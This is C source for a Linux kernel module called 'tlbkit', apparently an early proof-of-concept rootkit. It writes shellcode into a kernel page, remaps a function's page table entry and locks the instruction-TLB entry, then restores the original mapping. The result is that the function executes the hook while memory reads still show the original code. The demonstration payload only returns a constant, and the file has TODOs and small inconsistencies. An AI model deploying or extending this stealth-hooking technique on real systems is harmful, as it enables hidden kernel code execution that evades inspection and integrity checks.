#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h> // kmalloc
#include <linux/pgtable.h> // set_pte_at, not being linked
#include <asm/pgtable.h> // ?

#include "include/assembler.h"
#include "include/set_page_flags.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("wintermute");
MODULE_DESCRIPTION("tlbkit");
MODULE_VERSION("0.1");

extern int tlbkit_bad(void);
extern void tlbkit_lockdown_itlb_addr(uint32_t addr);
extern void tlbkit_invl_dtlb_addr(uint32_t addr);
extern void tlbkit_invl_itlb_addr(uint32_t addr);


void (*tlbkit_set_pte_at)(struct mm_struct *, unsigned long, pte_t *, pte_t) = NULL;

// update if shellcode changed
#define TLBKIT_HOOK_LEN 2

static int __init tlbkit_init(void)
{
    printk(KERN_INFO "tlbkit: module loaded\n", PAGE_SIZE);
    tlbkit_set_pte_at = rk_kallsyms_lookup_name("set_pte_at");

    // run read/execute tests pre-hook insertion
    printk(KERN_INFO "tlbkit: PRE-HOOK\n");
    printk(KERN_INFO "          `tlbkit_bad()` returns %d\n", tlbkit_bad());
    printk(KERN_INFO "          `tlbkit_bad()` read returns %lx\n", *((uint32_t *) tlbkit_bad));

    printk(KERN_INFO "tlbkit: installing hook...\n");

    // allocate inst page (mov badca11, itlb)
    //      TODO: allocate this page as last page (omitted) in atag
    //      TODO: make executable
    void *hook_page = kmalloc(PAGE_SIZE, GFP_KERNEL); // TODO: ensure cache-able
    // mov r0, 333
    // mov pc, lr
    unsigned char hook_shellcode[] = {
        0x4d, 0x01, 0x00, 0xe3, 0x0e, 0xf0, 0xa0, 0xe1,
    }; // 4d 01 00 e3 0e f0 a0 e1
    memcpy(hook_page, hook_shellcode, TLBKIT_HOOK_LEN * ARM64_INST_WIDTH);


    // save + update pgtables
    uintptr_t hook_page_phys = virt_to_phys(hook_page);
    pte_t *orig_page_ptep = virt_to_ptep((uintptr_t) tlbkit_bad);
    uintptr_t orig_page_phys = highmem_pte_to_phys(orig_page_ptep); // maybe use virt_to_phys here ?

    printk(KERN_INFO "      tlbkit_bad: virt @%lx, phys@%lx\n", tlbkit_bad, orig_page_phys);
    printk(KERN_INFO "      hook_page: virt @%lx, phys@%lx\n", hook_page, hook_page_phys);

    preempt_disable();
    tlbkit_set_pte_at(init_mm_ptr, (uintptr_t) tlbkit_bad, orig_page_ptep, pfn_pte(hook_page_phys >> PAGE_SHIFT, PAGE_KERNEL_EXEC));
    tlbkit_invl_itlb_addr((uintptr_t) tlbkit_bad);

    // lockdown inst page tlb entry
    //      - check cloaker for access pattern
    //      ?? may need to also lockdown dtlb page to ensure itlb not used ??
    //      disable interrupts, grab spinlock on all CPU
    tlbkit_lockdown_itlb_addr((uintptr_t) tlbkit_bad);

    // replace orig pgtable entry + dtlb entry post hook install
    tlbkit_set_pte_at(init_mm_ptr, (uintptr_t) tlbkit_bad, orig_page_ptep, pfn_pte(orig_page_phys >> PAGE_SHIFT, PAGE_KERNEL_EXEC));
    // flush dtlb, or we could lockdown dtlb before hook insertion ?
    tlbkit_invl_dtlb_addr(tlbkit_bad);
    preempt_enable();

    // run read/execute tests post-hook insertion
    printk(KERN_INFO "tlbkit: POST-HOOK\n");
    printk(KERN_INFO "          `tlbkit_bad()` returns %d\n", tlbkit_bad());
    printk(KERN_INFO "          `tlbkit_bad()` read returns %lx\n", *((uint32_t *) tlbkit_bad));

    return 0;
}

static void __exit tlbkit_exit(void)
{
    printk(KERN_INFO "tlbkit: module unloaded\n");
}

module_init(tlbkit_init);
module_exit(tlbkit_exit);
